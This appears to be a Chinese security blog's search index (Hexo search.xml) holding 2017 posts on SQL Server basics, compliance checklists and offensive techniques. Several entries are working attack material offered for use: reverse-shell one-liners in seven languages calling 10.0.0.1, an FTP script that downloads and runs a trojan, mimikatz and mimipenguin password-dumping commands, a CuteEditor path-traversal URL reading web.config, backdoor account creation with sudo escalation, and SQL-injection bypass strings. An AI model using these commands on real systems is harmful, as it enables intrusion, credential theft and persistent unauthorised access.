<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Windows抓取密码神器-mimikatz2.0]]></title>
    <url>%2F2017%2F08%2F03%2FWindows%E6%8A%93%E5%8F%96%E5%AF%86%E7%A0%81%E7%A5%9E%E5%99%A8-mimikatz2-0%2F</url>
    <content type="text"><![CDATA[使用方法：两条命令1234第一条：privilege::debug 提升权限第二条：sekurlsa::logonpasswords抓取密码 注意运行程序需要管理员权限。 测试通过：Microsoft Windows Server 2008 R2 Enterprise]]></content>
      <categories>
        <category>系统安全</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Microsoft SQL Server 学习笔记]]></title>
    <url>%2F2017%2F07%2F31%2FMicrosoft-SQL-Server-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[创建数据库1create database factory 数据库名为factory。 使用数据库1use factory 使用或者切换到数据库。 删除数据库1drop database factory 删除factory数据库。 创建表12345678910create table worker(wid char(3) primary key, -- id 主键wname varchar(10) not null, -- 名字 非空wsex char(2) check(wsex in ('男'，'女')), -- 性别 只能是‘男’或者‘女’ wbirthdate date, -- 生日wparty char(2), -- 政治面貌wjobdate date, -- 参加工作时间depid char(1) -- 部门) 创建worker数据表，保存员工的信息。 MSSQL中的数据类型字符类型：char(n)，varchar(n)，text，image整型类型：int(4字节)，smallint(2字节)，tinyint(1字节)浮点类型：float(8字节)，real(4字节)，decimal(精度28位)货币类型：money(8字节)，smallmoney(4字节)日期时间类型：date(年月日)，datetime(年月日时分秒毫秒)，smalldatetime（年月日时分秒）浮点类型：decimal(a,b) a指定指定小数点左边和右边可以存储的十进制数字的最大个数，最大精度38。b指定小数点右边可以存储的十进制数字的最大个数。小数位数必须是从 0 到 a之间的值。默认小数位数是 0。 数据库中数据的移动先分离数据库，然后移动.mdf和.ldf文件即可，两个文件需要同时移动，要不然在附加数据库的时候会报错。 数据库中的常用术语关系：一个关系对应一张二维表，二维表的表名即为关系名。关系模式：对关系表结构的描述。一般表示为“关系名（字段名1，字段名2，…，字段名n）”。记录：二维表中的一行称为关系的一条记录，或称为元组、行。字段：二维表中的列称为关系的字段，或称为属性、列。主码：关系中的某个字段或字段组，能唯一地标识一条记录，又称为主键。 表与表之间的关系外码(foreign key)：外码指的是这样的字段（或字段组），它在本表中不是主码，而在其他的表中是主码，外码又称为外键。参照完整性规则：外码的取值要么为空，要么必须来自于主码表中所存在的值。 查询简单查询select &lt;目标列1 [as 列名1]&gt;[，&lt;目标列2 [as 列名2]&gt;…] from &lt;表名&gt;；1select dname as 部门名,dmaster as 部门经理 from depart; 条件查询–条件查询–任务一查询salary（工资）表中实际工资(actualsalary)大于3000的职工号和实际工资。1select wid,actualsalary from salary where actualsalary&gt;=3000 –任务二查询salary（工资）表中实际工资(actualsalary)在2000和3000之间的–职工号和实际工资。123select wid,actualsalary from salary where actualsalary between 2000 and 3000select wid,actualsalary from salary where actualsalary&gt;=2000 and actualsalary&lt;=3000 –任务三查询worker(职工)表中在部门“1”或“2”工作的职工的职工号、姓名、部门号。123select wid,wname,depid from worker where depid in ('1','2')select wid,wname,depid from worker where depid='1' or depid='2' –任务四查询worker(职工)表中所有姓“孙”职工的职工号、姓名和性别;–查询worker(职工)表中所有姓名第二个字不是“华”的职工号、姓名和性别。123select wid,wname,wsex from worker where wname like '孙%'select wid,wname,wsex from worker where wname not like '_华%' –任务五查询depart（部门）表中部门经理为空的部门信息。1select * from depart where dmaster is null –任务六查询worker（职工）表中男职工是党员的职工号和姓名。1select wid,wname from worker where wsex='男' and wparty='是' 查询条件中可以使用的条件谓词 聚集查询聚集函数平均值函数 avg()计数函数 count()最大值函数 max()最小值函数 min()求和函数 sum() –任务一：查询salary（工资）表中日期为‘2011-01-04’的总工资(totalsalary)的平均工资。123select * from salaryselect AVG(totalsalary) as '2011-01-04平均工资' from salary where sdate='2011-01-04' –任务二：查询职工的总数；–查询在salary（工资）表中发过工资的职工人数，一个职工只计数一次。123456select * from workerselect * from salaryselect COUNT(*) as 职工总数 from workerselect COUNT(distinct wid) as 职工人数 from salary –任务三：查询salary（工资）表中最低的实发工资。1select MIN(actualsalary) as 最低工资 from salary –任务四：查询salary（工资）表中最高的实际工资。1select max(actualsalary) as 最高工资 from salary –任务五：查询salary（工资）表中‘2011-01-04’工资的总额。1select SUM(actualsalary) as 工资总额 from salary top和distinct–任务一：查询worker表中前两项职工的信息。1select top 2 * from worker –任务二：查询worker表中女职工所出现的部门号，相同的只出现一次1select distinct depid from worker where wsex='女' 附加子句查询order by子句–任务一–查询职工的职工号、职工姓名、出生日期、部门号，查询结果按照出生日期从早到晚排序。1select wid,wname,wbirthdate,depid from worker order by wbirthdate asc –任务二–查询职工的职工号、职工姓名、出生日期、部门号，查询结果按照出生日期从晚到早排序。1select wid,wname,wbirthdate,depid from worker order by wbirthdate desc –任务三–查询职工的职工号、职工姓名、出生日期、部门号，查询结果按照部门号从大到小排序，同一部门的按照出生日期从早到晚排序。1select wid,wname,wbirthdate,depid from worker order by depid desc,wbirthdate group by子句–任务一–分别统计男职工和女职工的人数。1select wsex as 性别,COUNT(*) as 职工人数 from worker group by wsex –任务二–分别统计每个日期的应发工资(totalsalary)总和。1select sdate as 发工资日期,SUM(totalsalary) from salary group by sdate having子句–任务一–分别统计每位员工的应发工资(totalsalary)总和，并且只显示工资总和在5000元以上的信息。1select wid as 职工号,SUM(totalsalary) as 工资总和 from salary group by wid having SUM(totalsalary)&gt;=5000 –任务二–统计worker表中各部门党员的人数，并且显示党员人数在2个人以上的相关信息。1select depid as 部门号,COUNT(*) as 党员人数 from worker where wparty='是' group by depid having COUNT(*)&gt;=1 注意：聚合函数不应该出现在where子句中，除非该聚合函数位于having子句或选择列表所包含的子查询中，并且要对其进行聚合的列是外部引用。 into子句–任务一–查询男职工的基本信息，并且存入临时表#worker1中。123select * into #worker from worker where wsex='男'select * from #worker 临时表只在当前连接中有效，断开数据库的连接，重新连接数据库，临时表丢失。 子查询in谓词子查询–任务一–查询与职工号为“001”的职工一起进行过企业相关培训的职工号。123456select widfrom studywhere wid&lt;&gt;'001' and study_id in(select study_idfrom studywhere wid='001') –任务二–查询与职工号为“001”的职工一起进行过企业相关培训的职工姓名。123456789select wnamefrom workerwhere wid in(select widfrom studywhere wid&lt;&gt;'001' and study_id in(select study_idfrom studywhere wid='001') ) 注意：’&lt;&gt;’表示’不等于’。 比较运算符子查询–任务一–查询2011年1月的实发工资小于该月平均实发工资的职工号。123456select widfrom salarywhere YEAR(sdate)=2011 and MONTH(sdate)=1 and actualsalary&lt;(select AVG(actualsalary)from salarywhere YEAR(sdate)=2011 and MONTH(sdate)=1) –任务二–查询比部门号为“1”的职工年龄都小的职工姓名和出生年月。123456select wname,wbirthdatefrom workerwhere wbirthdate&gt;all(select wbirthdatefrom workerwhere depid='1') –任务三–显示最高工资（应发工资）的职工所在的部门名。1234567891011select dnamefrom departwhere did=(select depidfrom workerwhere wid=(select widfrom salarywhere totalsalary=(select MAX(totalsalary)from salary))) –等价的多表连接查询12345select dnamefrom depart inner join worker on worker.depid=depart.did inner join salary on worker.wid=salary.widwhere totalsalary=(select MAX(totalsalary)from salary) –in谓词子查询任务二–查询与职工号为“001”的职工一起进行过企业相关培训的职工姓名。123456select wnamefrom worker inner join study on worker.wid=study.widwhere worker.wid&lt;&gt;'001' and study_id in(select study_idfrom studywhere wid='001') 使用子查询代替表达式–任务一–显示所有职工的职工号，姓名和平均工资。123select worker.wid,wname,AVG(totalsalary) as avgtoalfrom worker inner join salary on worker.wid=salary.widgroup by worker.wid,wname –任务二–使用子查询代替表达式123select worker.wid,wname,AVG(totalsalary) as avgtotalfrom worker inner join salary on worker.wid=salary.widgroup by worker.wid,wname 123select wid,wname,(select AVG(totalsalary) from salary where worker.wid=salary.wid) as avgtotalfrom worker exists谓词子查询–任务一–查询所有进行过岗前培训的职工号和职工姓名。12345678select wid,wnamefrom workerwhere exists(select *from studywhere worker.wid=study.wid and study_name='岗前培训') –任务二–查询所有未进行过岗前培训的职工号和职工姓名。12345678select wid,wnamefrom workerwhere not exists(select *from studywhere worker.wid=study.wid and study_name='岗前培训') union组合结果集–任务一–增加一个customer客户表，然后查询所有男职工和男客户的信息。1234567select wid as id,wname,wsex,wbirthdatefrom workerwhere wsex='男'unionselect cid,cname,csex,cbirthdatefrom customerwhere csex='男' –任务二–对于工资信息表salary，统计该表的工资总和。12345select wid,sdate,totalsalary,actualsalary from salaryunionselect '小计',null,SUM(totalsalary),SUM(actualsalary)from salary 注意：选择列表中的表达式数目必须相同。]]></content>
  </entry>
  <entry>
    <title><![CDATA[Linux抓取密码神器-mimipenguin]]></title>
    <url>%2F2017%2F07%2F27%2FLinux%E6%8A%93%E5%8F%96%E5%AF%86%E7%A0%81%E7%A5%9E%E5%99%A8-mimipenguin%2F</url>
    <content type="text"><![CDATA[项目地址1https://github.com/huntergregal/mimipenguin 使用实例注意：需要root权限 以下环境测试通过Kali 4.3.0 (rolling) x64 (gdm3)Ubuntu Desktop 12.04 LTS x64 (Gnome Keyring 3.18.3-0ubuntu2)Ubuntu Desktop 16.04 LTS x64 (Gnome Keyring 3.18.3-0ubuntu2)XUbuntu Desktop 16.04 x64 (Gnome Keyring 3.18.3-0ubuntu2)VSFTPd 3.0.3-8+b1 (Active FTP client connections)Apache2 2.4.25-3 (Active/Old HTTP BASIC AUTH Sessions)openssh-server 1:7.3p1-1 (Active SSH connections sudo usage)测试Centos7无法抓取密码。 原文地址：http://www.freebuf.com/sectool/131165.html]]></content>
      <categories>
        <category>系统安全</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Linux非交互式修改用户密码]]></title>
    <url>%2F2017%2F07%2F26%2FLinux%E9%9D%9E%E4%BA%A4%E4%BA%92%E5%BC%8F%E4%BF%AE%E6%94%B9%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%2F</url>
    <content type="text"><![CDATA[添加Linux账户的时候，一般需要交互式的设置账户密码，一般在Webshell中，交互式的命令无法执行，可以使用下面的命令，无交互式的添加账户：12useradd lzxecho "lzx:123456" | chpasswd 使用该方法添加的用户，在kali中测试，能够直接通过ssh登录系统，但是需要注意的是，用户的权限过低，大多数系统命令都无法执行。 添加用户权限，可以修改修改“/etc/sudoers”文件，将用户“lzx”加入其中，如下图所示：这样，该用户能够通过“sudo”执行其他的系统命令：]]></content>
      <categories>
        <category>系统安全</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[CuteEitor任意文件读取漏洞]]></title>
    <url>%2F2017%2F07%2F26%2FCuteEitor%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[漏洞描述CuteEditor for ASP.NET是建立在Html基础之上，最简单易用、功能最强大的所见即所得Asp.net在线编辑器。 CuteEditor可以帮助Asp.net开发者轻松的对原来文本框(Textarea)中的内容(包括文字、图片等Html内容)进行编辑，更重要得是这些内容编辑的实现是所见即所得方式。 CuteEditor还集成了文件(包括图片、文档等)上传、媒体(包括视频、声音等)文件直接插入等对你来说非常实用的功能模块。但是在 Load.ashx 文件中，未对 file 参数进行处理，可以加载任意文件。 利用方法http://www.woyigui.cn/CuteSoft_Client/CuteEditor/Load.ashx?type=image&amp;file=../../../web.config使用该方法，读取应用系统中，包含数据库连接密码的文件，从而进一步渗透。]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>编辑器</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux反弹shell的10种姿势]]></title>
    <url>%2F2017%2F07%2F21%2FLinux%E5%8F%8D%E5%BC%B9shell%E7%9A%8410%E7%A7%8D%E5%A7%BF%E5%8A%BF%2F</url>
    <content type="text"><![CDATA[bash版本1bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1 perl版本1perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;' python版本1python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' php版本1php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");' ruby版本1ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)' nc版本1nc -e /bin/sh 10.0.0.1 1234 1rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f 1nc x.x.x.x 8888|/bin/sh|nc x.x.x.x 9999 java版本123r = Runtime.getRuntime()p = r.exec(["/bin/bash","-c","exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"] as String[])p.waitFor() 实例在Webshell中执行系统命令不方便时，比如执行交互式命令时，可以考虑反弹shell到Windows主机上执行命令，Windows（ip：192.168.1.100）使用nc开启端口监听：1nc.exe -v -l -p 9999 Linux使用上面的方法反弹shell，例如使用nc反弹：1nc -e /bin/sh 192.168.1.100 1234]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[FTP传马]]></title>
    <url>%2F2017%2F07%2F18%2FFTP%E4%BC%A0%E9%A9%AC%2F</url>
    <content type="text"><![CDATA[如果能够执行远程计算机的系统命令，并且我们有一台FTP服务器，可以使用如下的方法下载FTP木马到远程计算机执行。在远程服务器上依次执行如下命令，将在C:\Windows\temp目录下，创建a.txt的文件。123456echo open ip地址 &gt;&gt; a.txt echo 123 &gt;&gt; a.txt echo 123 &gt;&gt; a.txt echo bin &gt;&gt; a.txt echo get muma.exe echo bye &gt;&gt; a.txt 注释如下：登陆FTP服务器用户名密码开始下载灰鸽子木马关闭FTP服务器 现在我们在远程计算机上执行下面的命令：ftp -s:c:\a.txt，意思是，读取a.txt里的参数，执行ftp命令，命令执行完后，木马文件muma.exe就下载到远程计算机里了，然后执行木马文件即可。]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[网络安全实验室-注入关]]></title>
    <url>%2F2017%2F07%2F13%2F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C%E5%AE%A4-%E6%B3%A8%E5%85%A5%E5%85%B3%2F</url>
    <content type="text"><![CDATA[地址http://hackinglab.cn/ShowQues.php?type=sqlinject 第一题最简单的SQL注入分值: 100Tips题目里有简单提示。writeup：很简单，直接万能口令绕过。用户名：admin’ or 1=1 #密码：任意字符 第二题最简单的SQL注入(熟悉注入环境)分值: 100最简单的SQL注入writeup：直接 后面跟上 “or 1=1”。参数id存在注入。 第三题防注入分值: 300小明终于知道，原来黑客如此的吊，还有sql注入这种高端技术，因此他开始学习防注入！writeup：本题添加了防注入代码，过滤掉了危险的单引号。 第五题邂逅分值: 350小明今天出门看见了一个漂亮的帅哥和漂亮的美女，于是他写到了他的日记本里。writeup：]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>CTF SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[telnet安装]]></title>
    <url>%2F2017%2F07%2F11%2Ftelnet%E5%AE%89%E8%A3%85%2F</url>
    <content type="text"><![CDATA[错误提示：1'telnet' is not recognized as an internal or external command 报错原因：在Win7, Vista, Windows Server 2008 R2上, telnet不是默认安装的，手动安装既可以解决问题。解决方案：1.点击Start-&gt;Control Panel-&gt;Programs;2.Turn Windows Features on or off;3.在列表中, 向下滚动, 选择Telnet Client;4.点击OK, 开始安装.]]></content>
      <categories>
        <category>系统安全</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[业务逻辑漏洞]]></title>
    <url>%2F2017%2F07%2F08%2F%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[业务逻辑漏洞的定义业务逻辑漏洞是指由于程序逻辑不严谨或逻辑太复杂，导致一些逻辑分支不能正常处理或处理错误。通俗地讲：一个系统的功能太多后，程序开发人员就难以思考全面，对某些地方可能有遗漏，或者未能正常处理，从而导致逻辑漏洞。逻辑漏洞也可以说是程序开发人员的思路错误、程序开发人员的逻辑存在漏洞。 特性业务逻辑漏洞是非常隐蔽的，它不像SQL注入、XSS跨站脚本攻击、命令执行、文件上传漏洞等有鲜明的标识，自动化扫描器可以定义一系列的规则识别出这些漏洞，而业务逻辑漏洞一般出现在功能（业务流程）上，这是漏洞扫描工具无法识别的。业务逻辑漏洞只出现于业务流程中（模块功能），也就是说，网站的任何部分都有可能存在着逻辑错误漏洞。比如，修改个人资料就完全可能出现逻辑错误漏洞。 常见危害任意用户密码修改、越权访问、任意用户密码找回、交易支付金额任意修改。 邮箱密码找回一般网站在找回密码时，会向用户绑定的邮箱发送一封确认的邮件，该邮件中包含有一个url链接，点击这个链接之后，会跳转到设置新密码的界面，注意，访问这个链接的时候，浏览器会带上我们之前登录这个网站的cookie，我们可以重点关注下cookie和这个url中的参数，看是否有我们的账号信息，如果有，尝试修改我们的账号为其他用户的账号，可能会重置其他用户的密码。 权限验证绕过未授权访问非授权访问是指用户在没有通过认证授权的情况下能够直接访问需要通过认证才能访问到的页面或文本信息。尝试将一些敏感的页面链接复制于其他浏览器或其他电脑上进行访问，看是否能访问成功。 越权访问垂直越权垂直越权（垂直越权是指使用权限低的用户可以访问权限较高的用户）。 水平越权水平越权（水平越权是指相同权限的不同用户可以互相访问）。 密保问题密码找回有些应用在找回密码时，需要验证用户的问题，验证问题答案使用的前端的js脚本验证的，服务器端没有校验，这样我们可以直接禁用浏览器中的JavaScript脚本，就可以绕过这个问题验证。]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[允许任何域的Flash文件访问资源]]></title>
    <url>%2F2017%2F07%2F06%2F%E5%85%81%E8%AE%B8%E4%BB%BB%E4%BD%95%E5%9F%9F%E7%9A%84Flash%E6%96%87%E4%BB%B6%E8%AE%BF%E9%97%AE%E8%B5%84%E6%BA%90%2F</url>
    <content type="text"><![CDATA[漏洞描述crossdomain.xml 是一个策略文件，定义 Web 页面资源是否能从不同域的 Flash 应用程序进行访问。当 Web 站点的 crossdomain.xml 策略太宽容（例如，允许任何域的 Flash 文件访问站点资源）时，可能会导致“跨站点伪造请求”或“跨站点跟踪”（“跨站点脚本编制”的变体）之类的攻击。 修复建议确保crossdomain.xml中domain的值为特定的域名，例如：allow-access-from domain=”*.test.com”。 flash跨域请求以www.qq.com为例，当浏览器在任意其他域的页面里加载了flash之后，如果对www.qq.com发起访问请求，flash会先检查www.qq.com上此策略文件是否存在，如果文件存在，则检查发起请求的域是否在许可范围之内。自flash 10以后，如有跨域访问需求，必须在目标域的根目录下放置crossdomain.xml文件，且该根目录下的配置文件称为“主策略文件”。若不存在主策略文件，则该域将禁止任何第三方域的flash跨域请求。主策略文件对全站的跨域访问起控制作用。]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[网络安全等级测评-主机安全-Windows]]></title>
    <url>%2F2017%2F06%2F14%2F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AD%89%E7%BA%A7%E6%B5%8B%E8%AF%84-%E4%B8%BB%E6%9C%BA%E5%AE%89%E5%85%A8-Windows%2F</url>
    <content type="text"><![CDATA[主机安全测评说明物理安全测评共有7项，分别是身份鉴别、访问控制、安全审计、剩余信息保护、入侵防范、恶意代码防范、资源控制。 各项要求、检查防范以及建议值（三级标准）注意：加粗字体为三级相对于二级增加的项目。 身份鉴别a) 应对登录操作系统和数据库系统的用户进行身份标识和鉴别；访谈管理员，是否为系统用户设置密码，并查看系统账户登录过程中是否使用了密码进行登录验证。 b) 操作系统和数据库系统管理用户身份标识应具有不易被冒用的特点，口令应有复杂度要求并定期更换；检查密码历史记录、密码最长使用期限、最短密码长度、密码复杂性要求等。检查方法：cmd-&gt;secpol.msc密码策略建议值：密码必须符合复杂性要求：启用（大写字母、小写字母、数字、特殊符号4种中的3种组合）密码长度最小值：8个字符密码最短使用期限：2天密码最长使用期限：70天强制密码历史：24个可用还原的加密来储存密码：禁用 c) 应启用登录失败处理功能，可采取结束会话、限制非法登录次数和自动退出等措施；cmd-&gt;secpol.msc查看账户锁定策略：建议值：账户锁定阈值：3~5次账户锁定时间:30min d) 当对服务器进行远程管理时，应采取必要措施，防止鉴别信息在网络传输过程中被窃听；1.确认操作系统必须是Windows Server 2003或者之后的版本；2.检查终端服务器是否使用了SSL加密，检查方法：检查安全层参数是否为SSL。 e) 应为操作系统和数据库系统的不同用户分配不同的用户名，确保用户名具有唯一性。只需检查Windows系统用户名是否有重复。检查方法：cmd-&gt;net user f) 应采用两种或两种以上组合的鉴别技术对管理用户进行身份鉴别。如果有除用户名/密码外的其他身份鉴别方法，则记录这种方法。否则记录“只使用用户名/口令”。 访问控制a) 应启用访问控制功能，依据安全策略控制用户对资源的访问；本项主要涉及两个方面的内容：文件权限、默认共享文件权限：重要目录不能对everyone账户开放。检查%systemdrive%\windows\system、%systemroot%\system32\config两个目录下的各个用户组的权限并记录。默认共享：默认共享功能是为了方便网络管理员通过网络对计算机进行远程管理设计的，为了保证系统安全，通常关闭。检查方法：cmd-&gt;net sharenetstat -an | find “LISTEN” 查看监听的端口查看注册表:HLM\SYSTEM\CurrentControlSet\Control\Lsa\restrictanonymous值是否为0，0表示共享开启，应为1。记录下默认的共享。 b) 应根据管理用户的角色分配权限，实现管理用户的权限分离，仅授予管理用户所需的最小权限；本地策略用户权限分配中查看：1.“从远端系统强制关机”只指派给Administrators组。2.“关闭系统”仅指派给Administrators组。3.“取得文件或其它对象的所有权”仅指派给Administrators。4.“管理审核和安全日志”仅指派给Administrators组。5.“从本地登录此计算机”指派给指定授权用户。6.“从网络访问此计算机”指派给Administrators组。检查方法：cmd-&gt;secpol.msc本地策略-&gt;用户权限分配 c) 应实现操作系统和数据库系统特权用户的权限分离；如果主机运行了数据库，询问并记录操作系统管理员和数据库管理员是否为同一人。如果没安装数据库，此项标记为不适用。 d) 应严格限制默认帐户的访问权限，重命名系统默认帐户，修改这些帐户的默认口令；1.检查默认账户是否重命名；2.询问是否已经修改默认账户口令；3.查看是否已经禁用Guest账户；检查方法：记录未重命名的默认账户，未禁用的默认账户。 e) 应及时删除多余的、过期的帐户，避免共享帐户的存在。询问账户的用途，确认账户是否是多余的、过期的、共享的账户。 f) 应对重要信息资源设置敏感标记；敏感标记的意思：比如某个文件的安全标记是10，权限小于10的用户，没有权利访问。 g) 应依据安全策略严格控制用户对有敏感标记重要信息资源的操作；主要是访谈和记录。 安全审计a) 审计范围应覆盖到服务器和重要客户端上的每个操作系统用户和数据库用户；查看系统是否开启了安全审计功能，询问是否有第三方审计工具或者系统，并且记录运行状态。检查方法：secpol.msc b) 审计内容应包括重要用户行为、系统资源的异常使用和重要系统命令的使用等系统内重要的安全相关事件；全部开启。 c) 审计记录应包括事件的日期、时间、类型、主体标识、客体标识和结果等；compmgmt.msc，查看日志文件是否满足要求。 d) 应能够根据记录数据进行分析，并生成审计报表； e) 应保护审计进程， 避免受到未预期的中断；检查审计进程的访问权限是否设置的合理。 f) 应保护审计记录， 避免受到未预期的删除、修改或覆盖等。访谈审计记录的存储、备份和保护措施，如配置日志服务器等。 剩余信息保护a) 应保证操作系统和数据库系统用户的鉴别信息所在的存储空间，被释放或再分配给其他用户前得到完全清除，无论这些信息是存放在硬盘上还是在内存中；本地策略的安全选项中查看是否启用“不显示上次登录用户名”，建议启用。 b) 应确保系统内的文件、目录和数据库记录等资源所在的存储空间，被释放或重新分配给其他用；在密码策略中禁用“用可还原的加密来存储密码”。“关机：清除虚拟内存页面文件”配置为“已启用”。 入侵防范a) 应能够检测到对重要服务器进行入侵的行为，能够记录入侵的源IP、攻击的类型、攻击的目的、攻击的时间，并在发生严重入侵事件时提供报警；主要是访谈，询问管理员查看日志的频率，是否合理配置防火墙，是否部署并合理配置了入侵检测系统，入侵检测系统是否具备报警的功能。 b) 应能够对重要程序的完整性进行检测，并在检测到完整性受到破坏后具有恢复的措施；访谈使用文件完整性检查工具或者脚本定期对重要文件的完整性进行检查，是否对重要的配置文件进行备份等。 c) 操作系统应遵循最小安装的原则，仅安装需要的组件和应用程序，并通过设置升级服务器等方式保持系统补丁及时得到更新。记录服务器中安装的多余的组件、应用程序。查看“程序和功能”是否安装了不必要的软件，Windows Update升级方式，升级频度，是否有厂家定期巡检进行系统补丁升级；询问是否安装了IPS(入侵防御系统)。 恶意代码防范a) 应安装防恶意代码软件，并及时更新防恶意代码软件版本和恶意代码库；查看是否安装了防恶意代码软件，若有，记录版本号，最后一次更新日期，升级方式。 b) 主机防恶意代码产品应具有与网络防恶意代码产品不同的恶意代码库；询问是否使用同一病毒库。 c) 应支持防恶意代码的统一管理。询问管理员是否采用统一的病毒更新策略和查杀策略。 资源控制a) 应通过设定终端接入方式、网络地址范围等条件限制终端登录；限制终端登录：1.关闭3389端口（regedit打开注册表查看HLM\SYSTEM\ CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp和HLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp中PortNamber的值是否为默认值3389）;2.查看防火墙入站规则；3.查看网络层防火墙过滤规则。 b) 应根据安全策略设置登录终端的操作超时锁定；限制远程登录空闲断开时间：本地策略安全选项中查看“Microsoft网络服务器：在挂起会话之前所需的空闲时间”（W2003）是否配置为15分钟。/“Microsoft网络服务器：暂停会话前所需的空闲时间量”（W2008）是否配置为15分钟。 c) 应对重要服务器进行监视，包括监视服务器的CPU、硬盘、内存、网络等资源的使用情况；打开“管理工具—性能监视器”查看CPU、内存等使用情况。 d) 应限制单个用户对系统资源的最大或最小使用限度；若不限制，一个用户占用的资源过多，很容易造成DoS攻击。 e) 应能够对系统的服务水平降低到预先规定的最小值进行检测和报警。询问系统管理员如何监控系统服务水平。，若有第三方监控程序，询问并查看是否有相关功能。 部分整改方法禁用默认共享如果要禁止C$、D$、E$一类的共享，可以单击“开始→运行”命令，在运行窗口键入“Regedit”后回车，打开注册表编辑器。依次展开[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\lanmanserver\parameters]分支，将右侧窗口中的DOWRD值“AutoShareServer”设置为“0”即可。如果要禁止ADMIN$共享，可以在同样的分支下，将右侧窗口中的DOWRD值“AutoShareWKs” 设置为“0”即可。如果要禁止IPC$共享，可以在注册表编辑器中依次展开[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa]分支，将右侧窗口中的DOWRD值“restrictanonymous”设置值为“1”即可。禁止admin$共享：net share admin$ /del 含义：关闭名admin$的共享。 访问默认共享开始-&gt;运行-&gt;\172.168.2.2\C$，直接访问C盘或者在浏览器下输入\172.168.2.2\C$回车 输入用户名、密码就可以了。 不必要的服务]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>等级保护</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网络安全等级测评-等保概念以及项目实施流程]]></title>
    <url>%2F2017%2F06%2F14%2F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AD%89%E7%BA%A7%E6%B5%8B%E8%AF%84-%E7%AD%89%E4%BF%9D%E6%A6%82%E5%BF%B5%E4%BB%A5%E5%8F%8A%E9%A1%B9%E7%9B%AE%E5%AE%9E%E6%96%BD%E6%B5%81%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[项目流程定级、备案、安全建设和整改、等级测评、检查五个步骤。 项目具体实施过程项目启动业务部门同事拿到项目之后，会通知做技术的同事，一起去客户现场做调研，收集相关的资料。 简要版差距分析前期做调研的时候，会简单看下客户的机房、网络结构等，出简单的差距分析报告。 定级备案收集系统或者网站的相关资料，完成定级报告和备案表，送给公安部备案，等待拿回备案号，同时和客户确定技术同事进场检查的时间。 现场测评物理、网络、主机、应用、数据、管理等安全测评，以及主机和应用的漏洞扫描和验证测试，出差距分析报告。 整改客户根据差距分析报告进行整改。 复测整改完成之后，技术同事进行复测。 最终报告复测完成之后，处最终的等保报告，等保报告中需要从公安拿回的备案号。]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>等级保护</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网络安全等级测评-物理安全]]></title>
    <url>%2F2017%2F06%2F12%2F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AD%89%E7%BA%A7%E6%B5%8B%E8%AF%84-%E7%89%A9%E7%90%86%E5%AE%89%E5%85%A8%2F</url>
